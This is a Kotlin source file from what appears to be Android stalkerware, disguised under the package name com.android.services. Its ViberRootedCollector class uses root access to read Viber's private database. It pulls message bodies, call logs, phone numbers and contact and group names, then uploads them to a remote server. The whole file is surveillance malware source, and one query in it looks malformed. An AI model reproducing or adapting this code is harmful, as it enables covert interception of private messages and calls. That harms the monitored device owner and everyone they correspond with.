package com.android.services.logs.collectors.im

import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.text.TextUtils
import com.android.services.db.entities.ViberRooted
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.RootPermission.acquireViberDatabasePermission
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class ViberRootedCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncViber) {
            try {
                val viberList = retrieveViberMessages(context, localDatabaseSource)
                if (viberList.isNotEmpty()) {
                    val startDate = viberList[viberList.size - 1].date
                    val endDate = viberList[0].date
                    val mViberSender = RemoteServerHelper(
                        context,
                        AppConstants.VIBER_ROOTED_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    mViberSender.upload(viberList)
                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.VIBER_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                    throwable = e
                )
            }
        } else {
            logVerbose("${AppConstants.VIBER_ROOTED_TYPE} Sync is Off")
        }
    }

    private fun retrieveViberMessages(
        context: Context,
        localDatabaseSource: LocalDatabaseSource,
    ): List<ViberRooted> {
        var viberMessagesList = ArrayList<ViberRooted>()
        try {
            acquireViberDatabasePermission()
            val viberDatabase = AppConstants.VIBER_DB_PATH + "viber_messages"
            val database =
                SQLiteDatabase.openDatabase(viberDatabase, null, SQLiteDatabase.OPEN_READONLY)
            val selection: String?
            val selectionArgs: Array<String>?
            val since: String
            val maxTimeStamp = localDatabaseSource.selectViberRootedMaxTimeStamp() ?: "0"
            since = maxTimeStamp.toString()
            if (since.isNotEmpty()) {
                selection = String.format("%s > ?", "msg_date")
                selectionArgs = arrayOf(since)
            } else {
                selection = null
                selectionArgs = null
            }

            val cursor = database.query("messages",
                null,
                selection,
                selectionArgs,
                null,
                null,
                "msg_date DESC")

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    val messageId = cursor.getString(cursor.getColumnIndex("_id"))
                    val conversationId = cursor.getString(cursor.getColumnIndex("conversation_id"))
                    val conversationType =
                        cursor.getString(cursor.getColumnIndex("conversation_type"))
                    var message = cursor.getString(cursor.getColumnIndex("body"))
                    val extraMime = cursor.getString(cursor.getColumnIndex("extra_mime"))
                    val groupId = cursor.getString(cursor.getColumnIndex("group_id"))
                    var type = cursor.getString(cursor.getColumnIndex("send_type"))
                    val timeStamp = cursor.getString(cursor.getColumnIndex("msg_date"))
                    val userId = cursor.getString(cursor.getColumnIndex("user_id"))
                    try {
                        type = if (type == "0") "incoming" else "outgoing"
                        var duration = ""
                        var isCall = "0"
                        var date = ""
                        if (extraMime == "1002") {
                            val cur = database.query("messages_calls",
                                arrayOf("viber_call_type", "date", "duration"),
                                "message_id=",
                                arrayOf(messageId),
                                null,
                                null,
                                null)
                            if (cur.moveToFirst()) {
                                isCall = if (cur.getString(0) == "1") "1" else "2"
                                date = cur.getString(1)
                                duration = cur.getString(2)
                            }
                            cur.close()
                            message = AppUtils.convertStringToBase64("no message")
                        } else if (extraMime == "0") {
                            date = timeStamp
                            message = AppUtils.convertStringToBase64(message)
                        } else {
                            continue
                        }
                        var senderNumber = ""
                        var senderName: String = ""
                        var conversationName: String = "Group"
                        val isMessage = groupId == "0" || conversationType == "0"
                        if (userId == null) {
                            val cur = database.query("participants_info",
                                arrayOf("number", "display_name"),
                                "participant_type=?",
                                arrayOf("0"),
                                null,
                                null,
                                null)
                            if (cur.moveToFirst()) {
                                senderNumber = cur.getString(0)
                                conversationName = cur.getString(1)
                            }
                            cur.close()
                        } else {
                            if (!isMessage) {
                                val cursor1 = database.query("conversations", arrayOf("name"),
                                    "group_id=?", arrayOf(groupId), null, null, null)
                                if (cursor1.moveToFirst()) {
                                    val gName = cursor1.getString(0)
                                    if (!TextUtils.isEmpty(gName)) conversationName = gName
                                }
                                cursor1.close()
                            }
                            val cConversations = database.query("participants_info",
                                arrayOf("number", "display_name", "contact_name"),
                                "member_id=?",
                                arrayOf(userId),
                                null,
                                null,
                                null)
                            if (cConversations.moveToFirst()) {
                                senderNumber = cConversations.getString(0)
                                val displayName = cConversations.getString(1)
                                val contactName = cConversations.getString(2)
                                if (isMessage) {
                                    if (!TextUtils.isEmpty(displayName)) {
                                        conversationName = displayName
                                        senderName = displayName
                                    } else {
                                        conversationName = contactName
                                        senderName = contactName
                                    }
                                } else {
                                    senderName =
                                        if (!TextUtils.isEmpty(displayName)) displayName else contactName
                                }
                            }
                            cConversations.close()
                        }

                        val viberRooted = ViberRooted()
                        viberRooted.apply {
                            this.conversationId = conversationId
                            this.conversationName = conversationName
                            this.message = message
                            this.type = type
                            this.messageDatetime = AppUtils.formatDate(date)
                            this.senderNumber = senderNumber
                            this.isCall = isCall != "0"
                            this.duration = duration
                            this.messageId = messageId
                            this.timeStamp = date.toLong()
                            this.date = AppUtils.getDate(date.toLong())
                            this.status = 0
                        }
                        viberMessagesList.add(viberRooted)
                    } catch (e: Exception) {
                        logVerbose(
                            "${AppConstants.VIBER_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                            throwable = e
                        )
                    }
                }
                cursor.close()
            }
            database.close()
            logVerbose("${AppConstants.VIBER_ROOTED_TYPE} rooted list = $viberMessagesList")
            if (viberMessagesList.isNotEmpty())
                localDatabaseSource.insertViberRooted(viberMessagesList)
            localDatabaseSource.selectViberRooted {
                viberMessagesList = it as ArrayList<ViberRooted>
            }
            logVerbose("${AppConstants.VIBER_ROOTED_TYPE} selected list = $viberMessagesList")
        } catch (e: Exception) {
            logVerbose(
                "${AppConstants.VIBER_ROOTED_TYPE} ${AppUtils.currentMethod} exp = ${e.message}",
                throwable = e
            )
        }
        return viberMessagesList
    }

}